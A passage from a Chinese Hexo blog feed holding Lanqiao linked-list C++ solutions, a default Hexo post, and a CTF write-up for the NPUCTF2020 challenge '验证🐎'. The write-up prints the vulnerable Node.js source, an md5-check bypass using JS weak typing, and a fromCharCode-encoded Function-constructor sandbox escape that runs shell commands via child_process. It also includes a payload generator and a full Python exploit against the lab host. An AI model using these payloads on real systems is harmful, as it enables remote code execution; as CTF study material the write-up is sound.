class="keyword">while</span>(s-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    cout&lt;&lt;s-&gt;next-&gt;data&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 请在此输入您的代码</span></span><br><span class="line">  LinkList L;</span><br><span class="line">  <span class="built_in">InitList</span>(L);</span><br><span class="line">  LNode *p;</span><br><span class="line">  p=L;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">InsertNextNode</span>(p,i);</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> M;cin&gt;&gt;M;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="comment">//printLink(L);</span></span><br><span class="line">  <span class="keyword">while</span>(M--)&#123;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="built_in">InsertX</span>(L,x);</span><br><span class="line">    <span class="built_in">printLink</span>(L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>bool InitList(LinkList &amp;L)</code>函数中的<code>&amp;</code>符号主要用于声明引用类型，<code>&amp;</code> 表示 <code>L</code> 是一个引用。引用的作用是让函数直接操作传入的变量，而不是变量的副本。如果不使用引用，函数内部对 <code>L</code> 的修改（如分配内存）不会影响到函数外部的变量。通过引用，函数可以直接修改外部变量的值，实现链表的初始化操作。</p>
<p><code>*</code>的作用是在链表操作中，指针（如 <code>LNode *s</code>）用于指向链表中的节点，通过指针可以方便地访问和修改节点的成员（如 <code>s-&gt;next</code>），从而实现链表的插入、删除等操作。</p>
<p>通过合理使用 <code>&amp;</code> 和 <code>*</code>，代码能够高效地实现链表的操作，同时避免了不必要的变量拷贝，提高了代码的效率和可读性。</p>
<p><a href="https://www.lanqiao.cn/problems/1110/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20"><a href="https://www.lanqiao.cn/problems/1110/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20">2.小王子单链表 - 蓝桥云课</a></a></p>
]]></content>
      <categories>
        <category>蓝桥题解</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>链表</tag>
        <tag>蓝桥题解</tag>
      </tags>
  </entry>
  <entry>
    <title>[NPUCTF2020]验证🐎</title>
    <url>/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/</url>
    <content><![CDATA[<p> 题目界面：</p>
<p><img src="/../images/0250526145943465.png" alt="image-20250526145943465"></p>
<p>点击链接出现JS源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入所需模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// Express web框架</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>); <span class="comment">// 解析HTTP请求体的中间件</span></span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>); <span class="comment">// 基于cookie的session中间件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>); <span class="comment">// 文件系统模块</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); <span class="comment">// 加密模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).<span class="property">keys</span>; <span class="comment">// 导入密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MD5哈希函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>) <span class="comment">// 创建MD5哈希</span></span><br><span class="line">    .<span class="title function_">update</span>(s) <span class="comment">// 更新哈希内容</span></span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>); <span class="comment">// 以16进制格式输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;更安全&quot;的eval函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saferEval</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="comment">// 过滤掉非数学表达式、运算符和数字的字符</span></span><br><span class="line">  <span class="keyword">if</span> (str.<span class="title function_">replace</span>(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果包含非法字符返回null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str); <span class="comment">// 否则执行eval</span></span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 注：上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取模板文件</span></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 渲染结果到模板</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">results</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)); <span class="comment">// 将结果数组用&lt;br/&gt;连接后插入模板</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Express应用</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); <span class="comment">// 解析application/x-www-form-urlencoded</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>()); <span class="comment">// 解析application/json</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用cookie-session中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieSession</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 注：嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys <span class="comment">// 使用导入的密钥</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 冻结Object和Math对象防止修改</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Math</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理POST请求</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.<span class="property">session</span>.<span class="property">results</span> || []; <span class="comment">// 获取session中的结果数组或初始化</span></span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.<span class="property">body</span>; <span class="comment">// 从请求体中解构参数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 验证first和second</span></span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="property">length</span> === second.<span class="property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="title function_">md5</span>(first+keys[<span class="number">0</span>]) === <span class="title function_">md5</span>(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试安全地执行表达式</span></span><br><span class="line">        result = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 将表达式和结果添加到结果数组开头</span></span><br><span class="line">      results.<span class="title function_">unshift</span>(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.<span class="title function_">unshift</span>(<span class="string">&#x27;Not verified!&#x27;</span>); <span class="comment">// 验证失败</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 限制结果数组长度不超过13</span></span><br><span class="line">  <span class="keyword">if</span> (results.<span class="property">length</span> &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">results</span> = results; <span class="comment">// 保存结果到session</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span>)); <span class="comment">// 渲染并返回结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 注：老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>); <span class="comment">// 设置响应头</span></span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>)); <span class="comment">// 返回当前文件内容</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径GET请求</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>); <span class="comment">// 设置响应头</span></span><br><span class="line">  req.<span class="property">session</span>.<span class="property">admin</span> = req.<span class="property">session</span>.<span class="property">admin</span> || <span class="number">0</span>; <span class="comment">// 初始化admin session</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span> = req.<span class="property">session</span>.<span class="property">results</span> || [])) <span class="comment">// 渲染并返回结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器监听80端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>) <span class="comment">// 启动日志</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>有 eval ，但是需要过两个关卡</p>
<h2 id="JS弱类型比较"><a href="#JS弱类型比较" class="headerlink" title="JS弱类型比较"></a>JS弱类型比较</h2><p>第一个是 一个if判断</p>
<p><code>if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123;</code><br>意思是first和second两个参数需要<strong>长度相同，互不相等，加 key[0] 之后 md5 相等</strong></p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><img src="/../images/20250526150806555.png" alt="image-20250526150806555"></p>
<p>可以看到数组[1]&#x3D;&#x3D;1在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
<p>在JavaScript中各个数据类型的相加的结果， 可以看到对象和字符串相加最后得到的是字符串，而数组和字符串相加最后也是得到字符串，</p>
<p>所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
<p><img src="/../images/20250526150905591.png" alt="image-20250526150905591"></p>
<p><img src="/../images/20250526151009449.png" alt="image-20250526151009449"></p>
<p>而<strong>长度length 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有length 的</strong>。</p>
<p>因此，根据题意，我们可以构造这样的payload进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;e&quot;:playlod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125; //因为是通过JSON来解析的</span><br></pre></td></tr></table></figure>

<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这还有个超大正则</p>
<p>看一下正则的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把满足正则表达式的部分全都删掉后传入的str为空才可以成功执行。</span><br><span class="line"></span><br><span class="line">看一下这个正则，第一部分是类似Math.xxx或只有Math这样的的，第二部分是可以包括这些字符：</span><br><span class="line">[()+\-*/&amp;|^%&lt;&gt;=,?:</span><br><span class="line"></span><br><span class="line">第三部分是以一定数字开头，然后跟0或者1个点，然后任意的数字，然后0或者一个类似e1111这样的。感觉这是整数，浮点数和科学计数法。</span><br><span class="line"></span><br><span class="line">形象解释：</span><br><span class="line">(?:Math(?:\.\w+)?)：匹配 Math.[0-9a-z]</span><br><span class="line">[()+\-*/&amp;|^%&lt;&gt;=,?:]：匹配中括号内任意一个字符（\-为减号）</span><br><span class="line">(?:\d+\.?\d*(?:e\d+)?)：匹配 数字开头 一个或零个点 一个或零个 e[0-9]</span><br><span class="line">：匹配空格</span><br></pre></td></tr></table></figure>

<p>先看大佬的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Math=&gt;(</span><br><span class="line">    Math=Math.constructor,</span><br><span class="line">    Math.x=Math.constructor(</span><br><span class="line">        Math.fromCharCode(</span><br><span class="line">114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)</span><br><span class="line">        )()))(Math+1)</span><br></pre></td></tr></table></figure>

<p>一步步解释：</p>
<p><code>Math</code>本身是一个 object</p>
<p>用一个例子来解释Math&#x3D;&gt;的意思</p>
<p><img src="/../images/20250526151942962.png" alt="image-20250526151942962"></p>
<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数</p>
<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2</p>
<p><img src="/../images/20250526152212095.png" alt="image-20250526152212095"></p>
<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Math.constructor.constructor(.....)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250526152404120.png" alt="image-20250526152404120"></p>
<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似</p>
<p>最终返回的是一个 <code>Function</code>，在 js 中 每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。它可以动态的创建一个函数，还是看例子</p>
<p><img src="/../images/20250526152431327.png" alt="image-20250526152431327"></p>
<p>那整个的一个结果就是创建函数，返回执行命令</p>
<p>可以写一个生成payload的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def gen(cmd):  </span><br><span class="line">s = f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&#123;cmd&#125;&#x27;).toString()&quot;  </span><br><span class="line">return &#x27;,&#x27;.join([str(ord(i)) for i in s])  </span><br><span class="line">  </span><br><span class="line">print(&#x27;String.fromCharCode(&#x27;+gen(&#x27;ls&#x27;)+&#x27;)&#x27;)</span><br><span class="line"></span><br><span class="line"># String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,108,115,39,41,46,116,111,83,116,114,105,110,103,40,41)</span><br></pre></td></tr></table></figure>

<p>最终exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests </span><br><span class="line">import json </span><br><span class="line">headers = &#123; &quot;Content-Type&quot;:&quot;application/json&quot; &#125; </span><br><span class="line">url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot; </span><br><span class="line">data = &#123;&quot;e&quot;:&#x27;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#x27;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125; </span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers) </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>JS弱类型比较</tag>
        <tag>Node.Js</tag>
        <tag>hash绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/06/02/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>小王子双链表（蓝桥1112）</title>
    <url>/2025/06/02/%E5%B0%8F%E7%8E%8B%E5%AD%90%E5%8F%8C%E9%93%BE%E8%A1%A8%EF%BC%88%E8%93%9D%E6%A1%A51112%EF%BC%89/</url>
    <content><![CDATA[<h1 id="小王子双链表（蓝桥1112）"><a href="#小王子双链表（蓝桥1112）" class="headerlink" title="小王子双链表（蓝桥1112）"></a>小王子双链表（蓝桥1112）</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">LNode</span> *next;</span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span>&#123;</span><br><span class="line">  L=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(L==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  L-&gt;next=L;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertNextLNode</span><span class="params">(LNode *p,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;data=x;</span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertX</span><span class="params">(LinkList L,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s=L;</span><br><span class="line">  <span class="keyword">while</span>(s-&gt;next-&gt;data!=x&amp;&amp;s-&gt;next!=L)&#123;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  LNode *t=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  t=s-&gt;next;</span><br><span class="line">  s-&gt;next=s-&gt;next-&gt;next;</span><br><span class="line">  t-&gt;next=L-&gt;next;</span><br><span class="line">  L-&gt;next=t;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">printLinkList</span><span class="params">(LinkList L)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s=L;</span><br><span class="line">  <span class="keyword">while</span>(s-&gt;next!=L)&#123;</span><br><span class="line">    cout&lt;&lt;s-&gt;next-&gt;data&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 请在此输入您的代码</span></span><br><span class="line"></span><br><span class="line">  LinkList L;</span><br><span class="line">  <span class="built_in">InitList</span>(L);</span><br><span class="line">  LNode *q;</span><br><span class="line">  q=L;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">InsertNextLNode</span>(q,i);</span><br><span class="line">    q=q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//printLinkList(L);</span></span><br><span class="line">  <span class="type">int</span> m;</span><br><span class="line">  cin&gt;&gt;m;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="built_in">InsertX</span>(L,x);</span><br><span class="line">    <span class="built_in">printLinkList</span>(L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.lanqiao.cn/problems/1112/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20"><a href="https://www.lanqiao.cn/problems/1112/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20">3.小王子双链表 - 蓝桥云课</a></a></p>
]]></content>
      <categories>
        <category>蓝桥题解</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>链表</tag>
        <tag>蓝桥题解</tag>
      </tags>
  </entry>
  <entry>
    <title>重新排队（蓝桥3255）</title>
    <url>/2025/06/02/%E9%87%8D%E6%96%B0%E6%8E%92%E9%98%9F%EF%BC%88%E8%93%9D%E6%A1%A53255%EF%BC%89/</url>
    <content><![CDATA[<h1 id="重新排队（蓝桥3255）"><a href="#重新排队（蓝桥3255）" class="headerlink" title="重新排队（蓝桥3255）"></a>重新排队（蓝桥3255）</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">LNode</span> *next;</span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span>&#123;</span><br><span class="line">  L=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(L==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertNextLNode</span><span class="params">(LNode *p,<span class="type">int</span> e)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;data=e;</span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertYX</span><span class="params">(LinkList L,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span 